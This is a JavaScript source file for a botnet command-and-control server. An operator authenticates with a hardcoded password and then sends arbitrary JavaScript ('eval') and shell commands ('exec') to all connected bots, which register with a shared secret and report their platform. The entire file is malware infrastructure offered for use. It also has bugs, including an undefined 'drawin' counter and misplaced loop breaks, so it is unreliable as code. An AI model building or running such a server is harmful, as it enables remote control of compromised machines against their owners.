import { Server } from 'socket.io';
const cncServer = new Server(7035);
const botServer = new Server(7305);

const OperatorSecret = "DEADBEEF"; // This will be required for operator to send to authenticate
const BotSecret = "BoT"; // This will be required for bot to verify it's integrity

let connectedBots = [];

class Bot
{
	constructor(socket, platform, web)
	{
		this.Socket = socket;
		this.Platform = platform;
		this.Web = web;
	}
}

cncServer.on('connection', function(socket) {
    console.log('[CNC] We have attempted operator connection');
	socket.emit('data', 'Enter your password', 'authenticate', true);
	
	socket.authenticated = false; // Set up upgraded socket
	
    socket.on("authenticate", function(key) {
		if(socket.authenticated)
		{	
			console.log('[CNC] User attempted double authentication!');
			socket.disconnect();
		} else {
			if(key === OperatorSecret)
			{
				console.log('[CNC] Operator successfully authenticated!');
				socket.emit('data', 'You have successfully authenticated!', null, false);
				socket.authenticated = true;
			} else {
				console.log('[CNC] Failed authentication attempt!');
				socket.emit('authentication', false);
				socket.disconnect();
			}
		}
    });
	
	socket.on("userResponse", function(receivedData) {
		if(!socket.authenticated) 
		{
			socket.disconnect();
			return;
		}
		
		let commandName = receivedData.split(" ")[0].toLowerCase();
		let suffix = receivedData.substring(commandName.length + 1);
		
		switch(commandName)
		{
			case 'help':
				socket.emit('data', 'Command list:\nhelp - Display all commands\nbotcount - Display count of connected bots\nplatform - Shows you how much bots are running each platform\neval <command> - Evaluates JavaScript code\nexec <command> - Execues shell command', null, false);
				break;
				
			case 'botcount':
				socket.emit('data', `There are currently ${connectedBots.length} bots connected`, null, false);
				break;
				
			case 'eval':
				for (let bot in connectedBots) {
					connectedBots[bot].Socket.emit('data', suffix);
				}
				socket.emit('data', `Message sent to all bots`, null, false);
				break;	
				
			case 'exec':
				for (let bot in connectedBots) {
					if(connectedBots[bot].Web)
						break;
					
					connectedBots[bot].Socket.emit('exdata', suffix);
				}
				socket.emit('data', `Message sent to all bots`, null, false);
				break;	

			case 'platform':
				let web = 0, darwin = 0, freebsd = 0, linux = 0, sunos = 0, win32 = 0;
				
				for(let bot in connectedBots)
				{
					if(connectedBots[bot].Web)
					{
						web++;
						break;
					}
					
					console.log(connectedBots[bot]);
					
					switch(connectedBots[bot].Platform)
					{
						case 'darwin':
							drawin++;
							break;
						
						case 'freebsd':
							freebsd++;
							break;
							
						case 'linux':
							linux++;
							break;
							
						case 'sunos':
							sunos++;
							break;
							
						case 'win32':
							win32++;
							break;
					}
				}
				
				socket.emit('data', `Platforms of bots are:\nWeb - ${web}\nDrawin - ${darwin}\nFreeBSD - ${freebsd}\nLinux - ${linux}\nSunos - ${sunos}\nWindows - ${win32}`, null, false);
				break;
				
			default:
				socket.emit('data', 'Unknown command', null, false);
				break;
		}	
	});
});

botServer.on('connection', function(socket) {	
	socket.authenticated = false; // Set up upgraded socket
	
    socket.on("authenticate", function(key, platform, web) {
		if(socket.authenticated)
		{	
			console.log('[BOT] Attempted double authentication!');
			socket.disconnect();
		} else {
			if(key === BotSecret)
			{
				let temporaryBot = new Bot(socket, platform, web);
				
				console.log('[BOT] New bot connected');
				connectedBots.push(temporaryBot);
				socket.authenticated = true;
				
			} else {
				socket.disconnect();
			}
		}
    });
});
